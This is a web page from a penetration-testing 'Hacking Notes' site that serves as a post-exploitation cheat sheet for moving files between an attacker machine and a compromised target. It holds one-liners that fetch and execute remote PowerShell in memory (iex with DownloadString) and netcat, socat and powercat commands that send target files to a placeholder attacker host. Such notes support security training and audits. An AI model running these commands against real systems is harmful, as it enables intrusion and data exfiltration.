<!DOCTYPE html>

<html>
	<head>
		<meta charset="utf-8">
		<meta name="viewport" content="width=device-width, initial-scale=1">

		<!-- Begin Jekyll SEO tag v2.5.0 -->
<title>Transfering Files | Hacking Notes</title>
<meta name="generator" content="Jekyll v3.8.4" />
<meta property="og:title" content="Transfering Files" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="In this section I’m going to enumerate difference methods to transfer files such us exploits or outputs of some scripts from our attacker machine to the target and viceversa." />
<meta property="og:description" content="In this section I’m going to enumerate difference methods to transfer files such us exploits or outputs of some scripts from our attacker machine to the target and viceversa." />
<link rel="canonical" href="http://0.0.0.0:4000/hackingnotes/post-exploitation/transfering-files/" />
<meta property="og:url" content="http://0.0.0.0:4000/hackingnotes/post-exploitation/transfering-files/" />
<meta property="og:site_name" content="Hacking Notes" />
<script type="application/ld+json">
{"description":"In this section I’m going to enumerate difference methods to transfer files such us exploits or outputs of some scripts from our attacker machine to the target and viceversa.","url":"http://0.0.0.0:4000/hackingnotes/post-exploitation/transfering-files/","@type":"Article","publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://0.0.0.0:4000/hackingnotes/siteicon.png"}},"headline":"Transfering Files","@context":"http://schema.org"}</script>
<!-- End Jekyll SEO tag -->

		<link type="application/atom+xml" rel="alternate" href="http://0.0.0.0:4000/hackingnotes/feed.xml" title="Hacking Notes" />

		<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Merriweather:400,400italic,700,700italic|Open+Sans:400,400italic,600,600italic,700,700italic|Inconsolata:400,700">
		<link rel="stylesheet" href="/hackingnotes/css/main.css">
		<link rel="apple-touch-icon" href="/hackingnotes/apple-touch-icon.png">
		<link rel="icon" type="image/png" href="/hackingnotes/touch-icon.png" sizes="192x192">
		<link rel="icon" type="image/png" href="/hackingnotes/images/favicon.png">

		
	</head>

	<body>
		<header>
			<h1>
				<a href="/hackingnotes/"><img src="/hackingnotes/images/emblem.svg" width="40" height="40" alt="Hacking Notes logo"></a>
				Hacking Notes
				<button type="button" class="open-nav" id="open-nav"></button>
			</h1>

			<form action="/hackingnotes/search/" method="get">
				<input type="text" name="q" id="search-input" placeholder="Search" autofocus>
				<input type="submit" value="Search" style="display: none;">
			</form>

			<nav class="full-navigation">
				<ul>
					<li class="nav-item top-level ">
						
						<a href="/hackingnotes/">What is this?</a>
					</li>
				</ul>

				<ul>
					
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/active-directory/domain-enumeration/">Active Directory</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/active-directory/domain-enumeration/">Domain Enumeration</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/active-directory/lateral-movement/">Lateral Movement</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/active-directory/domain-persistence/">Domain Persistence</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/active-directory/domain-privesc/">Domain Privilege Escalation</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/active-directory/cross-forest-attacks/">Cross Forest Attacks</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/active-directory/forest-persistence/">Forest Persistence</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/active-directory/ad-attacks/">AD Attacks</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/client-side-attacks/evil-pdf/">Client Side Attacks</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/client-side-attacks/evil-pdf/">Evil PDF</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/client-side-attacks/microsoft-office-macros/">Microsoft Office Macros</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/enumeration/host-discovery/">Enumeration</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/enumeration/host-discovery/">Host Discovery</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/enumeration/dns-enumeration/">DNS Enumeration</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/enumeration/os-discovery/">OS Discovery</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/enumeration/port-scanning/">Port Scanning</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/enumeration/waf-evasion/">WAF Evasion</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/exploiting/buffer-overflow/">Exploiting</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/exploiting/buffer-overflow/">Buffer Overflow</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/hacking-wifi/theory/">Hacking Wifi</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/hacking-wifi/theory/">Theory</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/hacking-wifi/wep/">Hacking Wifi - WEP</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/hacking-wifi/wpa-wpa2-psk/">Hacking Wifi - WPA/WPA2 PSK</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/hacking-wifi/wpa-wpa2-peap-enterprise/">Hacking Wifi - WPA/WPA2 PEAP (Enterprise)</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/other/hacking-aws/">Other</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/other/hacking-aws/">Hacking AWS</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/other/hacking-with-powershell/">Hacking with PowerShell</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level current">
							
							<a href="/hackingnotes/post-exploitation/av-evasion/">Post Exploitation</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/post-exploitation/av-evasion/">AV Evasion</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/post-exploitation/bypass-uac/">Bypass UAC</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/post-exploitation/get-credentials/">Gathering Credentials</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/post-exploitation/password-cracking/">Password Cracking</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/post-exploitation/port-forwarding/">Port Forwarding and Tunneling</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/post-exploitation/reverse-shell/">Reverse Shell</a></li>
								
									<li class="nav-item current"><a href="/hackingnotes/post-exploitation/transfering-files/">Transfering Files</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/privilege-escalation/linux-privesc/">Privilege Escalation</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/privilege-escalation/linux-privesc/">Linux Privesc</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/privilege-escalation/windows-privesc/">Windows Privesc</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/privilege-escalation/run-commands-as/">Run Commands As</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/reconnaissance/information-gathering/">Reconnaissance</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/reconnaissance/information-gathering/">Information Gathering</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/services/ftp/">Services</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/services/ftp/">PORT 21/tcp - FTP</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/smtp/">PORT 25/tcp - SMTP</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/dns/">PORT 53/tcp - DNS</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/http/">PORT 80/tcp, 443/tcp - HTTP Server</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/rpcbind/">PORT 111/tcp - RPCBind</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/imap/">PORT 143/tcp, 993/tcp - IMAP</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/smb/">PORT 139/tcp, 445/tcp - SMB</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/snmp/">PORT 161/udp - SNMP</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/java-rmi/">PORT 1100/tcp - Java RMI</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/sql-server/">PORT 1433/tcp - Microsoft SQL Server</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/nfs/">PORT 2049/tcp - NFS</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/mysql/">PORT 3306/tcp - MySQL Server</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/rdp/">PORT 3389/tcp - RDP</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/software/wordpress/">Software</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/software/wordpress/">WordPress</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/software/drupal/">Drupal</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/software/tomcat/">Tomcat</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/software/jenkins/">Jenkins</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/software/pypi-server/">PyPI Server</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/web/file-inclusion/">Web</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/web/file-inclusion/">File Inclusion</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/web/login-panes/">Login Panes</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/web/sqli/">SQL Injection (SQLi)</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/web/nosqli/">NoSQL Injection (NoSQLi)</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/web/templates-injections/">Server Side Templates Injections (SSTI)</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/web/unrestricted-file-upload/">Unrestricted File Upload</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/web/oauth-2.0-bypass/">OAuth 2.0 Bypass</a></li>
								
							</ul>
						</li>
					
				</ul>

				<ul>
					<li class="nav-item top-level ">
						
						<a href="/hackingnotes/changelog/">Change Log</a>
					</li>
				</ul>
			</nav>
		</header>

		<section class="main">
			<div class="page-header">
				<h2>Post Exploitation</h2>
				<h3>Transfering Files</h3>
			</div>
			<article class="content">
				<p>In this section I’m going to enumerate difference methods to transfer files such us exploits or outputs of some scripts from our attacker machine to the target and viceversa.</p>

<p>In order to perform our work we have the need of transfer some files and this post collects some of this methods. Let’s see, these are some possibilities of environment that we can find during our audits.</p>

<h1 id="linux--to-linux-">Linux 📤 to Linux 📥</h1>

<h2 id="http">HTTP</h2>

<p>First we need to start our <strong>server</strong> with python:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-m</span> http.server port
python <span class="nt">-m</span> SimpleHTTPServer port
php <span class="nt">-S</span> 0.0.0.0:port
ruby <span class="nt">-run</span> <span class="nt">-e</span> httpd <span class="nb">.</span> <span class="nt">-p</span> port
busybox httpd <span class="nt">-f</span> <span class="nt">-p</span> port
</code></pre></div></div>

<p>And download our files with Linux basics on the <strong>target</strong>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget http://ip-addr:port/file.name
curl http://ip-addr:port/file.name <span class="nt">-o</span> file.name
axel <span class="nt">-a</span> <span class="nt">-n</span> 20 <span class="nt">-o</span> file.name https://ip-addr:port/filen.name

<span class="c">#Freebsd</span>
fetch <span class="nt">-o</span> file.name <span class="nt">-q</span> <span class="nt">-R</span> http://ip-addr:port/file.name
</code></pre></div></div>

<h2 id="netcat--socat">Netcat / Socat</h2>

<p>There are more ways with different protocols or programs to transfer our files:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lp</span> port <span class="o">&gt;</span> file.name
<span class="nb">sudo </span>socat TCP4-LISTEN:port,fork file:file.name
</code></pre></div></div>

<p>And on the target:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-w</span> 3 ip-addr port &lt; file.name
<span class="nb">sudo </span>socat TCP4:ip-addr:port file:file.name,create
</code></pre></div></div>

<h2 id="ftp-file-transfer-protocol">FTP (File Transfer Protocol)</h2>

<p>First we need to start our ftp server, in this case I will use the Python module <strong>pyftpdlib</strong>, that allows you to set up our ftp server very quickly. To install you run the following command:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>apt-get <span class="nb">install </span>python-pyftpdlib
</code></pre></div></div>

<p>And start the <strong>server</strong>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python <span class="nt">-m</span> pyftpdlib <span class="nt">-p</span> 21
</code></pre></div></div>

<p>Finally you can download the file on the <strong>target</strong> with:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget ftp://ip-addr/file.name <span class="o">[</span><span class="nt">--ftp-user</span><span class="o">=</span>user] <span class="o">[</span><span class="nt">--ftp-password</span><span class="o">=</span>password]
axel <span class="nt">-a</span> <span class="nt">-n</span> 20 <span class="nt">-o</span> file.name ftp://ip-addr:port/filen.name
</code></pre></div></div>

<h2 id="base64-encoding">Base64 Encoding</h2>

<p>This is not the best solution beause you will need to Copy &amp; Paste the output, and if you need to transfer a big file could be so tedious. Btw this are the commands:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">base64 </span>file.name
</code></pre></div></div>

<p>Copy the result and paste on your machine inside some quotes:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">base64</span> <span class="nt">-d</span> <span class="s2">"ZmxhZ3tINGNrMW5nTjB0ZXN9Cg=="</span> <span class="o">&gt;</span> file.name
</code></pre></div></div>

<h1 id="linux--to-windows-">Linux 📤 to Windows 📥</h1>

<h2 id="http-1">HTTP</h2>

<p>First we need to start our <strong>server</strong> with python:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-m</span> http.server port
python <span class="nt">-m</span> SimpleHTTPServer port
</code></pre></div></div>

<p>And download our files with <strong>Windows</strong> basics on the <strong>target</strong>:</p>

<h3 id="via-cmd">Via CMD:</h3>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certutil <span class="nt">-urlcache</span> <span class="nt">-f</span> <span class="s2">"http://ip-addr:port/file.name"</span> file.name
powershell <span class="nt">-c</span> <span class="o">(</span>New-Object Net.WebClient<span class="o">)</span>.DownloadFile<span class="o">(</span><span class="s1">'http://ip-addr:port/file.name'</span>, <span class="s1">'file.name'</span><span class="o">)</span>
</code></pre></div></div>

<h3 id="via-powershell">Via Powershell:</h3>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>New-Object Net.WebClient<span class="o">)</span>.DownloadFile<span class="o">(</span><span class="s1">'http://ip-addr:port/file.name'</span>, <span class="s1">'file.name'</span><span class="o">)</span>
</code></pre></div></div>

<h3 id="import-powershell-script-without-storing-in-memory">Import Powershell Script without storing in memory</h3>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>iex (New-Object System.Net.Webclient).DownloadString('http://ip-addr:port/file.ps1')
iex (iwr 'http://ip-addr:port/file.ps1')
</code></pre></div></div>

<h2 id="smb">SMB</h2>

<p>Server Message Block (SMB) is a network protocol that allows us share files, printers, etc, between nodes that are Microsoft Windows.</p>

<p>To start a <strong>smb server</strong> you need to invoke smbserver.py class from <a href="https://github.com/SecureAuthCorp/impacket">impacket</a>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python smbserver.py NAME FOLDER
</code></pre></div></div>

<p>And simply copy the file in the share volume to the target:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>copy <span class="se">\\</span>ip-addr<span class="se">\N</span>AME<span class="se">\f</span>ile.name .<span class="se">\f</span>ile.name
</code></pre></div></div>

<p>Maybe there are some others ways to transfer files between Linux and Windows, but with these methods is more than enough to do our job!</p>

<h1 id="windows--to-linux-">Windows 📤 to Linux 📥</h1>

<p>This section will be similar to previous one.</p>

<h2 id="http-2">HTTP</h2>

<p>If the target have python installed you can start the <strong>server</strong> in the same way:</p>

<p><em>(Be careful on windows the python script in python2.7 is <code class="highlighter-rouge">http.server</code> and not <code class="highlighter-rouge">SimpleHTTPServer</code>)</em></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python <span class="nt">-m</span> http.server
</code></pre></div></div>

<p>And download our files with Linux basics on the <strong>target</strong>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget http://ip-addr:port/file.name
curl http://ip-addr:port/file.name <span class="nt">-o</span> file.name
</code></pre></div></div>

<h2 id="smb-1">SMB</h2>

<p>In that case the <strong>smb server</strong> will also start on the attacker’s machine (Linux). To start a <strong>smb server</strong> you need to invoke smbserver.py class from <a href="https://github.com/SecureAuthCorp/impacket">impacket</a>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python smbserver.py NAME FOLDER
</code></pre></div></div>

<p>But the differece will be the order of copy arguments:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>copy .<span class="se">\f</span>ile.name <span class="se">\\</span>ip-addr<span class="se">\N</span>AME<span class="se">\f</span>ile.name
</code></pre></div></div>

<h2 id="powercat">Powercat</h2>

<p>Powercat is essentially the powershell version of netcat. First need to install in yout kali Machine to download the script:</p>

<blockquote>
  <p><strong>Installation</strong>: sudo apt install powercat</p>
</blockquote>

<p>Then you will find the script in the following directory:</p>

<ul>
  <li><code class="highlighter-rouge">/usr/share/windows-resources/powercat/powercat.ps1</code></li>
</ul>

<p>Onced transfered the script and imported the module, start the listener on the kali</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -lp port &gt; file.name
</code></pre></div></div>

<p>And execute the following command to send the desired file.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>powercat -c ip-addr -p port -i file.name
</code></pre></div></div>

<h1 id="references">References:</h1>

<ul>
  <li><a href="https://ironhackers.es/cheatsheet/transferir-archivos-post-explotacion-cheatsheet/">https://ironhackers.es/cheatsheet/transferir-archivos-post-explotacion-cheatsheet/</a></li>
  <li><a href="https://guide.offsecnewbie.com/transferring-files">https://guide.offsecnewbie.com/transferring-files</a></li>
  <li><a href="https://medium.com/@PenTest\_duck/almost-all-the-ways-to-file-transfer-1bd6bf710d65">https://medium.com/@PenTest_duck/almost-all-the-ways-to-file-transfer-1bd6bf710d65</a></li>
</ul>

			</article>
		</section>

		<script>
			document.getElementById("open-nav").addEventListener("click", function () {
				document.body.classList.toggle("nav-open");
			});
		</script>
	</body>
</html>
